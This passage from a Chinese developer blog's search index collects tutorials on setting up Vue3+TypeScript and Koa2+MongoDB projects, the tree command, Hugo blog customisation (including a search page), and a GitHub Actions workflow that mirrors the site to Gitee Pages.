默认的设置非常适合快速创建一个新项目的原型，而手动设置则提供了更多的选项，它们是面向生产的项目更加需要的 3、进入vue3-ts，安装依赖 ts vuex vue-router vue3-lazy stylus // 安装 ts，会提示你选择 babel、styles等插件 cd vue3-ts vue add typescript vue add vuex vue add router npm install vue3-lazy -S npm install stylus stylus-loader --save-dev 四、项目结构 ├── README.md ├── babel.config.js ├── package-lock.json ├── package.json ├── public │ ├── favicon.ico │ └── index.html ├── src │ ├── App.vue │ ├── assets │ │ ├── logo.png │ │ └── styles │ │ └── varible.styl │ ├── components │ │ ├── HeaderNav.vue │ │ └── HelloWorld.vue │ ├── main.ts │ ├── router │ │ └── index.ts │ ├── shims-vue.d.ts │ ├── store │ │ └── index.ts │ ├── types │ │ └── movie.ts │ └── views │ ├── About.vue │ ├── Detail.vue │ ├── Home.vue │ ├── List.vue │ └── components │ ├── ListItem.vue │ └── TestInject.vue └── tsconfig.json 五、源码 example源码地址: vue3-ts\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/10.vue3%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/","summary":"\u003cp\u003e本文是vue3+ts项目系列第1篇《vue3项目从0到1搭建》，主要涉及到\u0026hellip;\u003c/p\u003e","title":"vue3+ts(1)：vue3项目从0到1搭建"},{"content":"输出优美的目录结构仅仅只需要\u0026hellip;\n一、安装 \u0026amp; 使用 i.安装\nMac OS # 安装 brew install tree Debian（Linux） $ sudo apt-get update # 建议每次安装前运行该命令，可得到在线软件库中软件的最新版本 $ sudo apt-get install tree $ tree --version # 参考：https://blog.csdn.net/oMcLin/article/details/108374673 ii.使用\n# 输出: 某文件下执行 $ tree 二、常用命令 注意大小写\n# 查看更多命令 tree --help # 只显示文件夹 tree -d # 要显示项目的层级。n为层级数 tree -L n # 例: 显示每个目录往下两级 tree -L 2 # 过滤不想显示的文件或者文件夹 tree -I pattern # 例: 过滤node依赖还有src文件夹 tree -I \u0026#39;node_modules|src\u0026#39; # 项目结构输出到 tree.txt 文件 tree \u0026gt; tree.txt 三、全部命令 -d 显示目录名称而非内容。 -D 列出文件或目录的更改时间。 -f 在每个文件或目录之前，显示完整的相对路径名称。 -F 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上\u0026quot;*\u0026quot;,\u0026quot;/\u0026quot;,\u0026quot;=\u0026quot;,\u0026quot;@\u0026quot;,\u0026quot;|\u0026ldquo;号。 -g 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。 -i 不以阶梯状列出文件或目录名称。 -I\u0026lt;范本样式\u0026gt; 不显示符合范本样式的文件或目录名称。 -l 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。 -n 不在文件和目录清单加上色彩。 -N 直接列出文件和目录名称，包括控制字符。 -p 列出权限标示。 -P\u0026lt;范本样式\u0026gt; 只显示符合范本样式的文件或目录名称。 -q 用\u0026rdquo;?\u0026ldquo;号取代控制字符，列出文件和目录名称。 -s 列出文件或目录大小。 -t 用文件和目录的更改时间排序。 -u 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。 -x 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该子目录予以排除在寻找范围外。 四、示例 ├── app │ ├── controller │ │ └── user.js │ ├── dbHelper │ │ └── user.js │ └── router.js ├── app.js ├── configs │ └── cors.js ├── package-lock.json ├── package.json └── start.js 菜鸟文档\n最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/tree-generate-project-directory/","summary":"\u003cp\u003e输出优美的目录结构仅仅只需要\u0026hellip;\u003c/p\u003e","title":"工具: Tree生成\"项目目录\"树形结构"},{"content":"自己搭建项目让我们不仅仅关注于开发本身，知其然知其所以然，收获更多\u0026hellip;\n一、前言 虽然，对于新手来说，我们选择类似于koa-generator之类的脚手架，可以最快的入手koa2或者node项目。但是，自己搭建项目，更加适用于实际开发中前后端分离的定制化业务场景，且能让我们不仅仅关注于开发本身，知其然知其所以然，收获更多的东西。\n在全局中安装koa依赖包 (保持项目版本的统一性)或在本地项目中安装\nnpm install -g koa npm install koa --save 二、创建项目 \u0026amp; 安装依赖 1、创建文件且初始化项目 npm init 2、安装依赖 // 路由 npm install koa-router koa-bodyparser --save // 热重启 npm install nodemon --save // 支持import模块的引入 npm install babel-plugin-transform-es2015-modules-commonjs babel-register --save // mongodb npm install mongoose --save // 解决跨域问题 npm install koa2-cors --save 三、配置 1、基础配置 最基本的开发环境已搭建完，开启service监听3000端口:\n对于任何请求，app将调用异步函数app.use(async (ctx, next) =\u0026gt; {})处理请求，只有当next()之后才能执行下一个app.use()\nconst Koa = require(\u0026#39;koa\u0026#39;) const app = new Koa({ // 代理 // proxy: true }); // logger app.use(async (ctx, next) =\u0026gt; { console.log(\u0026#39;--0-0--\u0026#39;) await next(); const rt = ctx.response.get(\u0026#39;X-Response-Time\u0026#39;) console.log(`--0-1-- ${ctx.method} ${ctx.url} - ${rt}`) }) // x-response-time app.use(async (ctx, next) =\u0026gt; { console.log(\u0026#39;--1-0--\u0026#39;) const start = new Date() await next() const ms = Date.now() - start; console.log(\u0026#39;--1-1--\u0026#39;) ctx.set(\u0026#39;X-Response-Time\u0026#39;, `${ms}ms`); }) // response app.use(async ctx =\u0026gt; { ctx.body = \u0026#39;Hello World, Koa!\u0026#39; }) app.listen(3000) 2、配置路由 const Koa = require(\u0026#39;koa\u0026#39;); const bodyParser = require(\u0026#39;koa-bodyparser\u0026#39;); const app = new Koa(); app.use(bodyParser()); // 解析request的body const router = require(\u0026#39;koa-router\u0026#39;)() router.get(\u0026#39;/\u0026#39;, async (ctx, next) =\u0026gt; { // todo }) app.use(router.routes()); app.listen(3000); console.log(\u0026#39;app started at port 3000...\u0026#39;) 可直接访问端口3000，若针对BFF层开发聚合接口，可增加api前缀标识\nconst Router = require(\u0026#39;koa-router\u0026#39;) const router = new Router({ prefix: \u0026#39;/api\u0026#39; }) 此时访问地址变为：http://localhost:3000/api\n3、热重启处理 对标webpack项目中的热更新，代码的修改，不必重新npm run start启动项目就可以实时的看到效果。对于node项目的管理，当然也有类似的工具：nodemon\nNodemon，用于监视源中的任何更改并自动重新启动服务器。支持自定义配置nodemon.json使用\n更改package.json，执行 npm run start，达到了热重启的效果\n// package.json \u0026#34;scripts\u0026#34;: { ... \u0026#34;start\u0026#34;: \u0026#34;nodemon app.js\u0026#34; }, 4、node 支持 import模块引入（可忽略） 原生的 node 不支持import引入模块，所以项目中强行使用import方式引入，会抛出类似报错信息: SyntaxError: Unexpected token import\n解决方案涉及按如下几个方面：\n安装 babel 依赖 根目录下创建 start.js 更改 package.json 安装如下依赖 npm install babel-plugin-transform-es2015-modules-commonjs babel-register --save 根目录下创建start.js require(\u0026#39;babel-register\u0026#39;) ( { plugins: [\u0026#39;babel-plugin-transform-es2015-modules-commonjs\u0026#39;], } ) module.exports = require(\u0026#39;./app.js\u0026#39;) 更改 package.json \u0026#34;scripts\u0026#34;: { ... \u0026#34;start\u0026#34;: \u0026#34;nodemon star.js\u0026#34; } 完成以上三个步骤，在app.js内使用import语法，运行 npm start，刚才报错信息消失\n5、连接数据库 安装：npm install mongoose --save 启动: mongod 视图管理: MongoDB Compass a. 搭建如下数据库： b. 查询语句 // 文件路径: app/dbHelper/user.js const MongoClient = require(\u0026#39;mongodb\u0026#39;).MongoClient; const assert = require(\u0026#39;assert\u0026#39;); // mongoDB const dbUrl = \u0026#34;mongodb://localhost:27017/testLocal\u0026#34;; const client = new MongoClient(dbUrl, {useNewUrlParser: true}); const dbName = \u0026#39;testLocal\u0026#39; const tableName = \u0026#39;user\u0026#39; /** * @desc: 查询所有用户 */ exports.queryUsers = function() { return new Promise(function (resolve, reject) { try { client.connect(function(err) { assert.equal(null, err); const db = client.db(dbName); const collection = db.collection(tableName); collection.find({}).toArray(function(err, result) { assert.equal(err, null); // console.log(\u0026#39;--db-1-result--\u0026#39;, result) client.close(); resolve(result) }); }) } catch(e) { reject(e) } }) } c. 运行程序查看结果 数据查询结果： 视图结果：\n到此为止，聚个BFF层接口功能的项目结构基本就满足了。\n6、解决跨域 对于接口跨域，解决的办法有很多，jsonp、cros、Nginx代理、node代理等。这里只介绍cros方案：koa2-cors\n入口文件\n// app.js 引入 const cors = require(\u0026#39;koa2-cors\u0026#39;) const app = new Koa() import corsConfigs from \u0026#39;./configs/cors\u0026#39; // 处理跨域的配置 app.use(cors(corsConfigs)); 配置文件\n// config/cors.js /** * @desc: 跨域处理配置项 * @author: lianpf * @date: 2021-02-24 * */ const corsConfigs = { exposeHeaders: [\u0026#39;WWW-Authenticate\u0026#39;, \u0026#39;Server-Authorization\u0026#39;, \u0026#39;Date\u0026#39;], maxAge: 100, credentials: true, allowMethods: [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;, \u0026#39;OPTIONS\u0026#39;], allowHeaders: [\u0026#39;Content-Type\u0026#39;, \u0026#39;Authorization\u0026#39;, \u0026#39;Accept\u0026#39;, \u0026#39;X-Custom-Header\u0026#39;, \u0026#39;anonymous\u0026#39;], } export default corsConfigs 四、TS \u0026amp; ESLint 待补充\u0026hellip;\n可收藏 曜灵（SUN）SITE 🌝，及时获取文章更新信息\n五、Project 结构图 ├── app │ ├── controller │ │ └── user.js │ ├── dbHelper │ │ └── user.js │ └── router.js ├── app.js ├── configs │ └── cors.js ├── package-lock.json ├── package.json └── start.js 源码参考 gitHub仓库: https://github.com/lianpf/examples/tree/master/node/koa2-mongodb\n关键文件 app.js\n/** * @desc: 入口文件 * @author: lianpf * @date: 2021-02-24 * */ const Koa = require(\u0026#39;koa\u0026#39;); const bodyParser = require(\u0026#39;koa-bodyparser\u0026#39;) const cors = require(\u0026#39;koa2-cors\u0026#39;) const app = new Koa() import router from \u0026#39;./app/router\u0026#39; import corsConfigs from \u0026#39;./configs/cors\u0026#39; // 处理跨域的配置 app.use(cors(corsConfigs)); // logger 中间件 // const loggerAsync = require(\u0026#39;./middleware/logger-async\u0026#39;) // app.use(loggerAsync()) // router app.use(bodyParser()); // 解析request的body app.use(router.routes()); // response // app.use(async ctx =\u0026gt; { // ctx.body = \u0026#39;Hello World, Koa!\u0026#39; // }) // 在端口3000监听: app.listen(3000); console.log(\u0026#39;app started at port 3000...\u0026#39;) package.json\n{ \u0026#34;name\u0026#34;: \u0026#34;koa2-ts-mongodb\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;koa2-mongodb-ts demo\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;app.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34;, \u0026#34;start\u0026#34;: \u0026#34;nodemon start.js\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;babel-plugin-transform-es2015-modules-commonjs\u0026#34;: \u0026#34;^6.26.2\u0026#34;, \u0026#34;babel-register\u0026#34;: \u0026#34;^6.26.0\u0026#34;, \u0026#34;koa\u0026#34;: \u0026#34;^2.13.1\u0026#34;, \u0026#34;koa-bodyparser\u0026#34;: \u0026#34;^4.3.0\u0026#34;, \u0026#34;koa-router\u0026#34;: \u0026#34;^10.0.0\u0026#34;, \u0026#34;koa2-cors\u0026#34;: \u0026#34;^2.0.6\u0026#34;, \u0026#34;mongoose\u0026#34;: \u0026#34;^5.11.18\u0026#34;, \u0026#34;nodemon\u0026#34;: \u0026#34;^2.0.7\u0026#34; }, \u0026#34;devDependencies\u0026#34;: { \u0026#34;@types/koa\u0026#34;: \u0026#34;^2.13.0\u0026#34;, \u0026#34;tslint\u0026#34;: \u0026#34;^6.1.3\u0026#34;, \u0026#34;typescript\u0026#34;: \u0026#34;^4.1.5\u0026#34; } } start.js\nrequire(\u0026#39;babel-register\u0026#39;) ( { plugins: [\u0026#39;babel-plugin-transform-es2015-modules-commonjs\u0026#39;], } ) module.exports = require(\u0026#39;./app.js\u0026#39;) app/router.js\nconst router = require(\u0026#39;koa-router\u0026#39;)() const User = require(\u0026#39;./controller/user\u0026#39;) router.get(\u0026#39;/\u0026#39;, User.query) export default router 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/backend-develop/node-koa2-mongodb-buildproject/","summary":"\u003cp\u003e自己搭建项目让我们不仅仅关注于开发本身，知其然知其所以然，收获更多\u0026hellip;\u003c/p\u003e","title":"Node: Koa2 + Mongodb(从0到1)搭建项目"},{"content":"关于使用hugo搭建博客过程中，遇到的一些小问题的解决方案\u0026hellip;\n官方使用文档\n一、配置项 1、高亮问题 插件：highlight 解决方案: 参考 关键步骤\n将下载解压的 highlight 文件夹放置于 static/js/ 下\nhighlight.pack.js 决定那些语言的代码会根据语法进行高亮 style文件夹中选择喜欢的css样式文件，css文件决定代码高亮的颜色 最后我选择了 agate.css\n然后需要在\u0026lt;head\u0026gt;中增加：\n// 主题可根据列表选择 - agate \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/js/highlight/styles/agate.css\u0026#34;\u0026gt; 在\u0026lt;body\u0026gt;结束前增加：\n\u0026lt;script src=\u0026#34;/js/highlight/highlight.pack.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;hljs.initHighlightingOnLoad();\u0026lt;/script\u0026gt; 2、菜单问题 增加权重\n3、目录(toc)问题 描述：最新版似乎有个bug：文章目录无法支持3级标题以下的显示 #240\nHugo (\u0026gt;=0.60.0) uses Goldmark as default renderer. You may add the following settings to your config.toml.\n[markup] [markup.tableOfContents] endLevel = 3 # 最小标题 ordered = false startLevel = 2 # 最大标题 See https://gohugo.io/getting-started/configuration-markup/#table-of-contents\n二、语法问题 1、定制 head / footer 基本布局页：layouts/_default/baseof.html 个性化配置页：layouts/partials/head.html、layouts/partials/zhihu.svg等 2、锚点：“back to top”按钮 插件：vanilla-back-to-top 个性化配置页 —— layouts/partials/footer.html页面嵌入如下代码：\n\u0026lt;script src=\u0026#34;https://unpkg.com/vanilla-back-to-top@7.1.14/dist/vanilla-back-to-top.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; addBackToTop({ diameter: 56, backgroundColor: \u0026#39;rgb(255, 82, 82)\u0026#39;, textColor: \u0026#39;#fff\u0026#39; }) \u0026lt;/script\u0026gt; 3、站内搜索 DuckDuckGo search google search 商业解决方案 Algolia 手动Coding解决 golang 暴力解法 手动Coding解决核心思想 (1) 搜索框触发 search function\nfunction search () { $.getJSON(baseUrl + \u0026#39;search.json\u0026#39;, function(result){ // 拿到搜索结果 }) } (2) search.json\n{ \u0026#34;results\u0026#34;: [ { \u0026#34;url\u0026#34;: \u0026#34;http://example.com/article3/\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Article3\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;word3a word3b word3c\u0026#34; }, { \u0026#34;url\u0026#34;: \u0026#34;http://example.com/article2/\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Article2\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;word2a word2b word2c\u0026#34; }, { \u0026#34;url\u0026#34;: \u0026#34;http://example.com/article1/\u0026#34;, \u0026#34;title\u0026#34;: \u0026#34;Article1\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;word1a word1b word1c\u0026#34; } ]} (3) 需要考虑的点\n如何根据现有文章，执行HUGO命令，自动生成 search.json 文件 拿到搜索结果，以什么形式展示搜索拿到的文章列表（新的search page 或 下拉面板） golang 暴力解法思路:\n利用hugo生成的index.xml文件进行内容搜索 hugo的content目录下的html文件会被编译到模板中去 利用以上特性使用js实现功能 html 转文本 时间格式转换 实现代码\n+++ title = \u0026#34;搜索\u0026#34; menu = \u0026#34;main\u0026#34; weight = 30 +++ \u0026lt;style\u0026gt; /* 手机适配 */ @media screen and (max-width: 500px) { .search{ padding-right: 25px; } .search input{ width: 100%; } .search button{ display: none; } } /* 电脑适配 */ @media screen and (min-width: 500px) { .search{ width: 500px; } .search input{ width: 444px; } } /* * @desc: 搜索页屏蔽page信息 * 1、头部 作者\u0026amp;分类信息 * 2、底部作者信息 */ .post__meta, .authorbox { display: none; } /* 通用样式 */ .search{ margin: auto; } .search input{ outline: none; border: 1.5px solid #62a1d5; height: 32px; padding: 10px; } .search button{ outline: none; border: 0px; height: 32px; width: 36px; position:absolute; background-color:#62a1d5; margin-left: 0.8rem; } .search .icon{ width: 26px; height: 26px; } .post__header .post__title { display: none; } .post-title a { color: #000; } .read-more { margin: 4px 0 8px; text-align: right; padding: 0 0.8rem 0; } .post { margin-bottom: 12px; } h3 { margin: 0.2rem 0 1rem; } .utterances { display: none; } \u0026lt;/style\u0026gt; \u0026lt;div class=\u0026#34;search\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;请输入搜索内容...\u0026#34; id=\u0026#34;search-key\u0026#34; /\u0026gt; \u0026lt;button onclick=\u0026#34;search()\u0026#34;\u0026gt; \u0026lt;svg t=\u0026#34;1583982313567\u0026#34; class=\u0026#34;icon\u0026#34; viewBox=\u0026#34;0 0 1024 1024\u0026#34; version=\u0026#34;1.1\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; p-id=\u0026#34;1271\u0026#34; width=\u0026#34;200\u0026#34; height=\u0026#34;200\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34;\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;\u0026lt;/style\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;path d=\u0026#34;M694.857143 475.428571q0-105.714286-75.142857-180.857142T438.857143 219.428571 258 294.571429 182.857143 475.428571t75.142857 180.857143T438.857143 731.428571t180.857143-75.142857T694.857143 475.428571z m292.571428 475.428572q0 29.714286-21.714285 51.428571t-51.428572 21.714286q-30.857143 0-51.428571-21.714286l-196-195.428571q-102.285714 70.857143-228 70.857143-81.714286 0-156.285714-31.714286t-128.571429-85.714286-85.714286-128.571428T36.571429 475.428571t31.714285-156.285714 85.714286-128.571428 128.571429-85.714286T438.857143 73.142857t156.285714 31.714286 128.571429 85.714286 85.714285 128.571428T841.142857 475.428571q0 125.714286-70.857143 228l196 196q21.142857 21.142857 21.142857 51.428572z\u0026#34; p-id=\u0026#34;1272\u0026#34; fill=\u0026#34;#ffffff\u0026#34;\u0026gt;\u0026lt;/path\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;h1 id=\u0026#34;search-tip\u0026#34; style=\u0026#34;color: #c05b4d;text-align: center;display: none;\u0026#34;\u0026gt;搜索中，请稍后 ...\u0026lt;/h1\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;div id=\u0026#34;result\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; // enter window.onload = function() { document.onkeydown = function(ev) { var event = ev || event if (event.keyCode == 13) { search() } } } // search function search() { key = document.getElementById(\u0026#34;search-key\u0026#34;).value; if (key === \u0026#34;\u0026#34;) { return; } document.getElementById(\u0026#34;search-key\u0026#34;).value = \u0026#34;\u0026#34;; // tip document.getElementById(\u0026#34;search-tip\u0026#34;).innerText = \u0026#34;搜索中，请稍后 ...\u0026#34;; document.getElementById(\u0026#34;search-tip\u0026#34;).style.display = \u0026#34;block\u0026#34;; // clear var el = document.getElementById(\u0026#39;result\u0026#39;); var childs = el.childNodes; for (var i = childs.length - 1; i \u0026gt;= 0; i--) { el.removeChild(childs[i]); } // xml xmltext = new XMLHttpRequest; xmltext.open(\u0026#34;GET\u0026#34;, \u0026#34;/index.xml\u0026#34;, false); xmltext.send(); resp = xmltext.responseXML; items = resp.getElementsByTagName(\u0026#34;item\u0026#34;); // search var i = 0; haveResult = false; while (i \u0026lt; items.length) { txt = items[i].getElementsByTagName(\u0026#34;title\u0026#34;)[0].innerHTML + items[i].getElementsByTagName(\u0026#34;description\u0026#34;)[0].innerHTML if (txt.indexOf(key) \u0026gt; -1) { haveResult = true; title = items[i].getElementsByTagName(\u0026#34;title\u0026#34;)[0].innerHTML; link = items[i].getElementsByTagName(\u0026#34;link\u0026#34;)[0].innerHTML; time = items[i].getElementsByTagName(\u0026#34;pubDate\u0026#34;)[0].innerHTML; mark = items[i].getElementsByTagName(\u0026#34;description\u0026#34;)[0].innerHTML; time = formatDate(time) mark = xmlToTextString(mark); addItem(title, link, time, mark) } i++; } if (!haveResult) { document.getElementById(\u0026#34;search-tip\u0026#34;).innerText = \u0026#34;搜索完毕，未发现结果 ...\u0026#34;; document.getElementById(\u0026#34;search-tip\u0026#34;).style.display = \u0026#34;block\u0026#34;; } } // add function addItem(title, link, time, mark) { document.getElementById(\u0026#34;search-tip\u0026#34;).style.display = \u0026#34;none\u0026#34;; tmpl = \u0026#34;\u0026lt;article class=\\\u0026#34;post\\\u0026#34; style=\\\u0026#34;border-bottom: 1px solid #e6e6e6;\\\u0026#34; \u0026gt;\u0026#34; + \u0026#34;\u0026lt;header class=\\\u0026#34;post-header\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34;\u0026lt;h3 class=\\\u0026#34;post-title\\\u0026#34;\u0026gt;\u0026lt;a class=\\\u0026#34;post-link\\\u0026#34; href=\\\u0026#34;\u0026#34; + link + \u0026#34;\\\u0026#34; target=\\\u0026#34;_blank\\\u0026#34;\u0026gt;\u0026#34; + title + \u0026#34;\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt;\u0026#34; + \u0026#34;\u0026lt;div class=\\\u0026#34;post-meta\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34; \u0026lt;span class=\\\u0026#34;post-time\\\u0026#34;\u0026gt;日期：\u0026#34; + time + \u0026#34;\u0026lt;/span\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34; + \u0026#34; \u0026lt;/header\u0026gt;\u0026#34; + \u0026#34;\u0026lt;div class=\\\u0026#34;post-content\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34;\u0026lt;div class=\\\u0026#34;post-summary\\\u0026#34;\u0026gt;摘要：\u0026#34; + mark + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34; + \u0026#34;\u0026lt;div class=\\\u0026#34;read-more\\\u0026#34;\u0026gt;\u0026#34; + \u0026#34;\u0026lt;a href=\\\u0026#34;\u0026#34; + link + \u0026#34;\\\u0026#34; class=\\\u0026#34;read-more-link\\\u0026#34; target=\\\u0026#34;_blank\\\u0026#34;\u0026gt;阅读更多\u0026lt;/a\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34; + \u0026#34; \u0026lt;/div\u0026gt;\u0026#34; + \u0026#34;\u0026lt;/article\u0026gt;\u0026#34; div = document.createElement(\u0026#34;div\u0026#34;) div.innerHTML = tmpl; document.getElementById(\u0026#39;result\u0026#39;).appendChild(div) } // html 转化 text() function xmlToTextString(xmlStr) { var htmlStr = xmlStr.replace( /\u0026amp;amp;/g, \u0026#34;\u0026amp;\u0026#34;).replace( /\u0026amp;quot;/g, \u0026#39;\u0026#34;\u0026#39;).replace( /\u0026amp;lt;/g, \u0026#34;\u0026lt;\u0026#34;).replace( /\u0026amp;gt;/g, \u0026#34;\u0026gt;\u0026#34;); var dd = htmlStr.replace(/\u0026lt;\\/?.+?\u0026gt;/g, \u0026#34;\u0026#34;); var dds= dd.replace(/ /g, \u0026#34;\u0026#34;); return dds } // 1. 若小于10，前面加0 function isZero(m){ return m\u0026lt;10?\u0026#39;0\u0026#39;+m:m } // 将字符串转为Date格式，获取对应的年、月、日、时、分、秒。组合格式 function formatDate(DateStr) { //时间戳是整数，否则要parseInt转换 var time = new Date(DateStr); // 需要使用Date格式进行日期转化，若是时间戳、字符串时间，需要通过new Date(..)转化 var y = time.getFullYear(); var m = time.getMonth()+1; var d = time.getDate(); return y+\u0026#39;年\u0026#39;+isZero(m)+\u0026#39;月\u0026#39;+isZero(d)+\u0026#39;日\u0026#39;; } \u0026lt;/script\u0026gt; 最后， 希望大家早日实现：成为编程高手的伟大梦想！ 欢迎交流~\n本文版权归原作者曜灵所有！未经允许，严禁转载！对非法转载者, 原作者保留采用法律手段追究的权利！ 若需转载，请联系微信公众号：连先生有猫病，可获取作者联系方式！\n","permalink":"https://lianpf.github.io/posts/other/tools-docs-hugo-grammar/","summary":"\u003cp\u003e关于使用hugo搭建博客过程中，遇到的一些小问题的解决方案\u0026hellip;\u003c/p\u003e","title":"工具: Hugo语法纪要"},{"content":" 一、回顾『国外站点gitHub』自动构建发布 GitHub Action + Hugo 自动构建发布个人博客请参考这里：自动化构建博客\n二、『国内站点gitee』同步构建发布 因为不使用付费的Gitee Pages Pro服务，那么Gitee不能像GitHub一样自动部署Pages，而我们又想实现Blogs国外和国内两个站点的同步构建发布。那么思路如下：\n首先保证使用GitHub Actions，可以实现国外站点的自动构建发布 同步GitHub代码到Gitee: 使用GitHub actions Yikun/hub-mirror-action@master Gitee构建发布：yanglbme/gitee-pages-action@main 1. secrets配置 在执行gitHub Actions脚本的仓库里：\n配置secrets.GITEE_PRIVATE_KEY 配置secrets.GITEE_TOKEN 配置secrets.GITEE_PASSWORD 注意：\n配置secrets的仓库，是执行Actions的仓库xxx/Blogs.git，而不是国外站点静态文件存储仓库xxx/xxx.github.io.git 配置secrets的位置是在xxx/Blogs.git仓库的Settings -\u0026gt; Secrets -\u0026gt; Actions位置，点击 New repository secret secrets.GITEE_PRIVATE_KEY配置一定要是『本地的密钥对』全局ssh key的密钥，我这里配置的是id_rsa secrets.GITEE_PRIVATE_KEY对应的公钥(id_rsa.pub)，要配置在『需要同步的远程仓库』里，我这里是Gitee ssh生成参考：git中ssh与https | Blogs\n2.『非同名仓库』代码同步问题：Yikun/hub-mirror-action@master 使用Yikun/hub-mirror-action@master可实现从GitHub到Gitee的代码同步 但对于国外站点lianpf.github.io和国内站点lianpf仓库不同名的问题，需要增加配置：mappings: \u0026quot;lianpf.github.io=\u0026gt;lianpf\u0026quot; 使用配置如下：\nname: GiteePages ... jobs: deploy: runs-on: ubuntu-18.04 steps: - name: Sync to Gitee uses: Yikun/hub-mirror-action@master with: # 替换为你的 GitHub 用户名 src: github/lianpf # 替换为你的 Gitee 用户名 dst: gitee/lianpf dst_key: ${{ secrets.GITEE_PRIVATE_KEY }} dst_token: ${{ secrets.GITEE_TOKEN }} # 仓库名不同时，同步 mappings: \u0026#34;lianpf.github.io=\u0026gt;lianpf\u0026#34; static_list: \u0026#34;lianpf.github.io\u0026#34; force_update: true debug: true ... 3. 国内站点Gitee Page发布问题：yanglbme/gitee-pages-action@main name: GiteePages ... jobs: deploy: runs-on: ubuntu-18.04 steps: ... - name: Build Gitee Pages uses: yanglbme/gitee-pages-action@main with: # 注意替换为你的 Gitee 用户名 gitee-username: lianpf # 注意替换为你的 Gitee 用户名 gitee-password: ${{ secrets.GITEE_PASSWORD }} # 注意替换为你的 Gitee 仓库，仓库名严格区分大小写，请准确填写，否则会出错 gitee-repo: lianpf/lianpf # 要部署的分支，默认是 master，若是其他分支，则需要指定（指定的分支必须存在） branch: master 三、双站点『自动化同步构建发布』完整配置 name: GitHubPages on: push: branches: - master # 设置部署分支 paths-ignore: # 忽略文件 - \u0026#39;README.md\u0026#39; - \u0026#39;.env\u0026#39; - \u0026#39;.gitignore\u0026#39; - \u0026#39;bin\u0026#39; jobs: deploy: runs-on: ubuntu-18.04 steps: - uses: actions/checkout@v2 with: submodules: recursive # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod # - name: Read .env # id: hugo-version # run: | # . ./.env # echo \u0026#34;::set-output name=HUGO_VERSION::${HUGO_VERSION}\u0026#34; - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: # hugo-version: \u0026#39;${{ steps.hugo-version.outputs.HUGO_VERSION }}\u0026#39; hugo-version: \u0026#39;0.75.1\u0026#39; # 0.75.1 latest extended: true - name: Build run: | hugo --minify echo -e \u0026#34;Generated by Hugo.\\nLatest build: $(date).\\n\u0026#34; \u0026gt; public/README - name: Deploy GitHub uses: peaceiris/actions-gh-pages@v3 with: deploy_key: ${{ secrets.ACTIONS_DEPLOY_KEY }} external_repository: lianpf/lianpf.github.io publish_branch: master publish_dir: ./public - name: Sync to Gitee uses: Yikun/hub-mirror-action@master with: # 替换为你的 GitHub 用户名 src: github/lianpf # 替换为你的 Gitee 用户名 dst: gitee/lianpf dst_key: ${{ secrets.GITEE_PRIVATE_KEY }} dst_token: ${{ secrets.GITEE_TOKEN }} # 仓库名不同时，同步 mappings: \u0026#34;lianpf.github.io=\u0026gt;lianpf\u0026#34; static_list: \u0026#34;lianpf.github.io\u0026#34; force_update: true debug: true - name: Build And Deploy Gitee Pages uses: 